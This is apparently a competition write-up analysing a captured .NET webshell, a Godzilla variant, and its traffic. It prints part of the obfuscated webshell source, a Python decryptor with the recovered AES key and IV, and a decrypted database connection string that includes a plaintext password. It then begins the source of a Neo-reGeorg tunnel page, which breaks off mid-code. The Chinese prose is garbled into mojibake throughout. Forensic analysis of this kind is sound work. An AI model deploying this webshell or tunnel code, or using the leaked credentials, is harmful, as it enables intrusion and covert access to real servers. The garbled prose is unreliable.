RD(string str) &#123;byte[] tmp = B64d(str);while (Encoding.UTF8.GetString(tmp).StartsWith(&quot;sign:&quot;)) &#123;tmp = B64d(Reverse(Encoding.UTF8.GetString(tmp).Substring(5)));&#125;return tmp;&#125;public static string B64e(byte[] byteArray) &#123;Type convertType = typeof(Convert);MethodInfo tBSM = convertType.GetMethod(GetStr(9), new Type[] &#123; typeof(byte[]) &#125;);string base64String = (string)tBSM.Invoke(null, new object[] &#123; byteArray &#125;);return base64String;&#125;public static byte[] B64d(string bs) &#123;Type convertType = typeof(Convert);MethodInfo fBSM = convertType.GetMethod(GetStr(10), new Type[] &#123; typeof(string) &#125;);byte[] byteArray = (byte[])fBSM.Invoke(null, new object[] &#123; bs &#125;);return byteArray;&#125;public static string Reverse(string s) &#123;char[] charArray = s.ToCharArray();Array.Reverse(charArray);return new string(charArray);&#125;public static String GetStr(int x) &#123;String[] xs = new String[]&#123;&quot;Uhtxhvw&quot;, &quot;UhtxhvwWbsh&quot;, &quot;SRVW&quot;, &quot;79ehf9e8470119i5&quot;, &quot;9220gf6228514959&quot;, &quot;Lwhp&quot;, &quot;orjlqFd&quot;, &quot;Ordg&quot;, &quot;OB&quot;, &quot;WrEdvh64Vwulqj&quot;, &quot;IurpEdvh64Vwulqj&quot;&#125;;return kdecrypt(xs[x], 3);&#125;public static  String kencrypt(string text, int shift)&#123;return ProcessText(text, shift);&#125;public static String  kdecrypt(string text, int shift)&#123;return ProcessText(text, 26 - shift);&#125;private static string ProcessText(string text, int shift)&#123;char[] buffer = text.ToCharArray();for (int i = 0; i &lt; buffer.Length; i++)&#123;char letter = buffer[i];if (char.IsLetter(letter))&#123;char baseChar = char.IsLower(letter) ? &#x27;a&#x27; : &#x27;A&#x27;;letter = (char)((letter - baseChar + shift) % 26 + baseChar);&#125;buffer[i] = letter;&#125;return new string(buffer);&#125;&lt;/script&gt;&lt;%@Language=cs%&gt;&lt;%@Import Namespace=&quot;System.Reflection&quot;%&gt;&lt;%@Import Namespace=&quot;System.Text&quot;%&gt;&lt;%@Import Namespace=&quot;System.Security.Cryptography&quot;%&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæœ¨é©¬çœ‹èµ·æ¥å¾ˆä¹±ï¼Œå…¶å®æ ¸å¿ƒåŠŸèƒ½å°±ä¸¤ä¸ªç‚¹ï¼Œæœ‰å°ä¼™ä¼´åœ¨æ‰“æˆ˜çš„æ—¶å€™åº”è¯¥è§è¿‡è¿™ä¸ªğŸï¼Œè¿™æ˜¯ä¸€ä¸ªäºŒå¼€çš„å“¥æ–¯æ‹‰çš„ğŸï¼Œä½†æ˜¯åº”è¯¥ä¸æ˜¯ä»€ä¹ˆå…¬å¼€ç‰ˆæœ¬ï¼Œåº”è¯¥æ˜¯å°åœˆå­åœ¨ä½¿ç”¨ï¼Œ<img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204102102095.png" alt="image-20251204102102095"></p><p>å¦‚æœä½ åœ¨æ‰“æˆ˜çš„æ—¶å€™æˆ–è€…åº”æ€¥çš„æ—¶å€™ï¼Œç›´æ¥è®¿é—®è¿™ä¸ªé©¬ï¼Œè§åˆ°<code>&#123;&quot;Error&quot;:&quot;Unauthorized&quot;&#125;&#125;</code>è¯´æ˜æ˜¯è¿™ä¸ªäº†ã€‚å¥½çš„ï¼Œæ­¤æ—¶æˆ‘ä»¬æ¥åˆ†ææœ¨é©¬ã€‚</p><p>è¿™ä¸ªé©¬çœ‹èµ·æ¥å¾ˆé•¿ï¼Œå…¶å®éƒ½æ˜¯ å‡çš„ï¼Œæ ¸å¿ƒåœ¨&lt;script ä¸­ï¼Œä¸Šé¢éƒ½æ˜¯æ··æ·†ï¼Œæ•°ç»„å–å­—ç¬¦ä¸²å•¥çš„ã€‚<img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204102523144.png" alt="image-20251204102523144"></p><p>æ‰£é™¤äº†ä¹‹åæ˜¯<img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204102809844.png" alt="image-20251204102809844"></p><p>å¤§æ¦‚è¿™ä¸ªæ ·å­ï¼Œè¿™é‡Œ ï¼Œå¤šçœ‹webshellçš„åŒå­¦åº”è¯¥èƒ½æƒ³åˆ°ï¼Œå…¶ä¸­è¿™ä¸¤ä¸ªæ•°å­—åº”è¯¥æ˜¯keyï¼Œivï¼Œæ˜¯çš„ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯å®Œå…¨å¯¹ï¼Œæˆ‘ä»¬çœ‹GetStr å‡½æ•° æœ€åreturnæ˜¯ï¼Œè°ƒç”¨çš„kdecryptå‡½æ•°ï¼Œä¼ äº†ä¸¤ä¸ªå‚æ•°ä¸€ä¸ªxs[x]ï¼Œä¸€ä¸ª3ï¼Œå…ˆçœ‹å‰é¢è¿™ä¸ªxsçš„x  ä¹Ÿå°±æ˜¯è¿™ä¸ªæ•°ç»„çš„3  xæ˜¯å¤šå°‘å‘¢ <img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204103645575.png" alt="image-20251204103645575"></p><p>æ‰€æœ‰çš„ä»£ç ä¸­ï¼Œå¯ä»¥çœ‹åˆ°<code>string key=GetStr(3);stringinitVector=GetStr(4);</code> keyä¸º3 ivä¸º4ï¼Œâ€79ehf9e8470119i5â€, â€œ9220gf6228514959â€,è¿™ä¿©å°±æ˜¯ï¼Œåœ¨çœ‹<img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204105152693.png" alt="image-20251204105152693"></p><p>decryptå‡½æ•°è¾“è°ƒç”¨äº† ProcessTextå‡½æ•°ï¼ŒProcessTextæ˜¯å‡¯æ’’ï¼Œä¹Ÿå°±æ˜¯åç§»3ï¼Œä¹Ÿå°±æ˜¯è¯´å°†â€79ehf9e8470119i5â€, â€œ9220gf6228514959â€-3å³å¯ï¼Œå‡¯æ’’åªå‡å­—æ¯ï¼Œä¸å‡æ•°å­—ï¼Œ  <code>key = b&#39;79bec9b8470119f5,iv  = b&#39;9220dc6228514959&#39;</code></p><p>æ¥ä¸‹æ¥çœ‹é©¬å·¥ä½œæµç¨‹<img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204111818799.png" alt="image-20251204111818799"></p><p>è¿™é‡Œæœ€åè°ƒç”¨reå‡½æ•°ï¼Œè¿›è¡ŒaesåŠ å¯†ï¼Œreå‡½æ•°  å°±æ˜¯ <img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204111858032.png" alt="image-20251204111858032"></p><p>ç®€å•æ¥è¯´å°±æ˜¯ ï¼Œå¦‚æœä¼ çš„&gt;512000å°±ä¸åœ¨å¾ªç¯ï¼Œåº”è¯¥æ€•ä¼ è¾“æ•°æ®å¤ªå¤šäº†ï¼Œå¦åˆ™å°±è¿›è¡Œå¾ªç¯å¹¶å­—ç¬¦ä¸²åè½¬ï¼Œå•¥æ„æ€å‘¢ï¼Œæ‹¿ä¸ªä»£ç æ¥è§£é‡Šï¼ŒåŸå§‹æ•°æ®</p><p>AuthType=apiLogin&amp;name=sysadmin&amp;loginCa=c2lnbjo9TW1NczVtWXE5V01YVlVNdlJXVjVnM1ZyUkdlWGhsU0lObVZHSjBUVmxqU1hoa1ZDWmxhU1ZVVEk1a1ZVMUdkb05HTXgwMFN3UTJVT3RHYkxSbE0xQW5UNnAwTVBaRmJ4d2tlR056WXIxa01PcEdieFJtUkN4bVlIeG1XWGRFWng4RVZLTlhVcUoxU2hoa1N4bDFWS2xIWlZobVRrQmpVNXhrZWtCbFVWWlZTT3BuUXUxVVIxUWxWcTVrVmxwbVNWTjFST2hVWXJKMVNTUmxTaFJWVkdCMVVXbFVlaFZWVzVWMVU1c1dZeEkwVlJKVFV5SW1hRk5EWkd4MmJUQmpTd1VGVnNwRlpWQjNkVEJUVjFVRlZCSmpXR3BrVmtSMGF3UTFVMEZHVnJOWE1UVkVkelVHU29aVlpIaFRla2RsVlkxRVdPRmxVWEZqUU5OalF4TWxWV1pWVVhGelROVjFiOW9qYm5sMmM=</p><p>åªè¦loginca<img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204112539984.png" alt="image-20251204112539984"></p><p>æ˜æ˜¾base64 åè½¬äº†ï¼Œå°±æŒ‰è¿™ä¸ªä¸€ç›´åè½¬<img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204112623119.png" alt="image-20251204112623119"></p><p>ä¸€ç›´æ¥è§£  <img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204113003502.png" alt="image-20251204113003502"></p><p>ä»£ç ä¸­æ˜¯ï¼Œæœ‰signå°±ä¸€ç›´è§£ï¼Œæœ€åä¸€æ¬¡è§£aesã€‚<img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204113744556.png" alt="image-20251204113744556"></p><p>åé¢è¿˜æœ‰ä¸€ä¸ªgunzipã€‚å°±å¯ä»¥è§£å‡ºæ¥äº†ï¼Œè¿™é‡Œç®€å•å†™ä¸€ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">encoded: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    è¿˜åŸ C# RD() é€»è¾‘ï¼š</span></span><br><span class="line"><span class="string">      Base64 â†’ sign: å¾ªç¯è§£åŒ… â†’ reverse â†’ Base64 â€¦â€¦</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    tmp = base64.b64decode(encoded)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = tmp.decode(<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s.startswith(<span class="string">&quot;sign:&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        inner = s[<span class="number">5</span>:]          <span class="comment"># å» sign:</span></span><br><span class="line">        inner = inner[::-<span class="number">1</span>]    <span class="comment"># reverse</span></span><br><span class="line">        tmp = base64.b64decode(inner)</span><br><span class="line">        <span class="comment">#print(&quot;sign è§£åŒ…ä¸­: &quot;, tmp)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_and_gunzip</span>(<span class="params">cipher_raw: <span class="built_in">bytes</span>, key: <span class="built_in">bytes</span>, iv: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    AES-128-CBC è§£å¯† + å» padding + gunzip</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    plaintext = cipher.decrypt(cipher_raw)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Remove PKCS7 padding</span></span><br><span class="line">    pad = plaintext[-<span class="number">1</span>]</span><br><span class="line">    plaintext = plaintext[:-pad]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Gunzip</span></span><br><span class="line">    buf = BytesIO(plaintext)</span><br><span class="line">    decompressed = gzip.GzipFile(fileobj=buf).read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decompressed</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ======================</span></span><br><span class="line"><span class="comment"># Main</span></span><br><span class="line"><span class="comment"># ======================</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ciphertext = <span class="string">&quot;c2lnbjo9TW1NczVtWXE5V01YVlVNdlJXVjVnM1ZyUkdlWGhsU0lObVZHSjBUVmxqU1hoa1ZDWmxhU1ZVVEk1a1ZVMUdkb05HTXgwMFN3UTJVT3RHYkxSbE0xQW5UNnAwTVBaRmJ4d2tlR056WXIxa01PcEdieFJtUkN4bVlIeG1XWGRFWng4RVZLTlhVcUoxU2hoa1N4bDFWS2xIWlZobVRrQmpVNXhrZWtCbFVWWlZTT3BuUXUxVVIxUWxWcTVrVmxwbVNWTjFST2hVWXJKMVNTUmxTaFJWVkdCMVVXbFVlaFZWVzVWMVU1c1dZeEkwVlJKVFV5SW1hRk5EWkd4MmJUQmpTd1VGVnNwRlpWQjNkVEJUVjFVRlZCSmpXR3BrVmtSMGF3UTFVMEZHVnJOWE1UVkVkelVHU29aVlpIaFRla2RsVlkxRVdPRmxVWEZqUU5OalF4TWxWV1pWVVhGelROVjFiOW9qYm5sMmM=&quot;</span></span><br><span class="line">    key = <span class="string">b&#x27;79bec9b8470119f5&#x27;</span></span><br><span class="line">    iv  = <span class="string">b&#x27;9220dc6228514959&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># sign: è§£åŒ…</span></span><br><span class="line">    stage1 = decrypt(ciphertext)</span><br><span class="line">    <span class="comment"># print(&quot;sign è§£åŒ…ç»“æœ:&quot;, stage1)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># AES + gunzip</span></span><br><span class="line">    final = decrypt_and_gunzip(stage1, key, iv)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æœ€ç»ˆè§£å¯†ç»“æœ:\n&quot;</span>, final.decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line"></span><br><span class="line">  <span class="comment">#dbUsernamedishexecSql&amp;SELECT * FROM `dish`.`card` LIMIT 0,10dbTypemysqlmethodNameexecSqldbCharsetUTF-8sessionIdbf405e2fd97cddd3execTyp</span></span><br><span class="line">selectconnectStringFserver=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;port=<span class="number">3301</span>;uid=dish;pwd=Sovell$))!<span class="number">79959</span>;database=dish;dbPasswordSovell$))!79959dbDriver&amp;MySql.Data.MySqlCl</span><br><span class="line">ient.MySqlConnection</span><br></pre></td></tr></table></figure><p><img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204113930654.png" alt="image-20251204113930654"></p><p>è¿™æ ·å°±æ–¹ä¾¿äº†ä¸€äº›ã€‚è¿™é‡Œä¸å¤ªæ¸…æ¥šé¢˜ç›®æ˜¯å•¥ï¼Œip ç«¯å£ è´¦å·å¯†ç å·²ç»å¾—åˆ°ï¼Œå¤§æ¦‚è¿™äº›å§ã€‚ç»§ç»­å¾€ä¸‹åˆ†æã€‚</p><p>ç»™äº†ä¸€ä¸ªä»£ç†çš„æ–‡ä»¶ï¼Œæ˜¯httpçš„éš§é“ï¼ŒNeo-reGeorgçš„ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; EnableSessionState=&quot;True&quot;%&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Net&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Text&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Net.Sockets&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Collections&quot; %&gt;</span><br><span class="line">&lt;script runat=&quot;server&quot;&gt;</span><br><span class="line">     private static char[] constant =</span><br><span class="line">      &#123;</span><br><span class="line">        &#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,</span><br><span class="line">        &#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;l&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,</span><br><span class="line">        &#x27;A&#x27;,&#x27;B&#x27;,&#x27;C&#x27;,&#x27;D&#x27;,&#x27;E&#x27;,&#x27;F&#x27;,&#x27;G&#x27;,&#x27;H&#x27;,&#x27;I&#x27;,&#x27;J&#x27;,&#x27;K&#x27;,&#x27;L&#x27;,&#x27;M&#x27;,&#x27;N&#x27;,&#x27;O&#x27;,&#x27;P&#x27;,&#x27;Q&#x27;,&#x27;R&#x27;,&#x27;S&#x27;,&#x27;T&#x27;,&#x27;U&#x27;,&#x27;V&#x27;,&#x27;W&#x27;,&#x27;X&#x27;,&#x27;Y&#x27;,&#x27;Z&#x27;</span><br><span class="line">      &#125;;</span><br><span class="line">    static String en = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;;</span><br><span class="line">    static String de = &quot;o5n/OZUfAMhHmcyXK9wD1uvgdEQ64sBGlbTxqLRC2+YJk3zj8trWNVIiSe7pFPa0&quot;;</span><br><span class="line"></span><br><span class="line">    public static String StrTr(string input, string frm, string to) &#123;</span><br><span class="line">        String r = &quot;&quot;;</span><br><span class="line">        for(int i=0; i&lt; input.Length; i++) &#123;</span><br><span class="line">            int index = frm.IndexOf(input[i]);</span><br><span class="line">            if(index != -1)</span><br><span class="line">                r += to[index];</span><br><span class="line">            else</span><br><span class="line">                r += input[i];</span><br><span class="line">        &#125;</span><br><span class="line">        return r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object[] blv_decode(byte[] data) &#123;</span><br><span class="line">        Object[] info = new Object[40];</span><br><span class="line"></span><br><span class="line">        int i = 0;</span><br><span class="line">        int data_len = data.Length;</span><br><span class="line">        int b;</span><br><span class="line">        byte[] length = new byte[4];</span><br><span class="line"></span><br><span class="line">        MemoryStream dataInput = new MemoryStream(data);</span><br><span class="line"></span><br><span class="line">        while ( i &lt; data_len ) &#123;</span><br><span class="line">            b = dataInput.ReadByte();</span><br><span class="line">            dataInput.Read(length, 0, length.Length);</span><br><span class="line">            int l = bytesToInt(length) - 257191907;</span><br><span class="line">            byte[] v = new byte[l];</span><br><span class="line">            dataInput.Read(v, 0, v.Length);</span><br><span class="line">            i += ( 5 + l );</span><br><span class="line">            if ( b &gt; 1 &amp;&amp; b &lt;= 9 ) &#123;</span><br><span class="line">                info[b] = Encoding.Default.GetString(v);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                info[b] = v;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] blv_encode(Object[] info) &#123;</span><br><span class="line">        Random r = new Random();</span><br><span class="line">        info[0]  = randBytes(r, 20, 256);</span><br><span class="line">        info[39] = randBytes(r, 20, 256);</span><br><span class="line">        MemoryStream buf = new MemoryStream();</span><br><span class="line">        for (int b = 0; b &lt; info.Length; b++) &#123;</span><br><span class="line">            if ( info[b] != null ) &#123;</span><br><span class="line">                Object o = info[b];</span><br><span class="line">                byte[] v;</span><br><span class="line">                if ( o is String )&#123;</span><br><span class="line">                    v = Encoding.Default.GetBytes( (String) o );</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    v = (byte[]) o;</span><br><span class="line">                &#125;</span><br><span class="line">                buf.WriteByte((byte) b);</span><br><span class="line">                try &#123;</span><br><span class="line">                    byte[] l = intToBytes(v.Length + 257191907);</span><br><span class="line">                    buf.Write(l, 0, l.Length);</span><br><span class="line">                    buf.Write(v, 0, v.Length);</span><br><span class="line">                &#125;catch(Exception e) 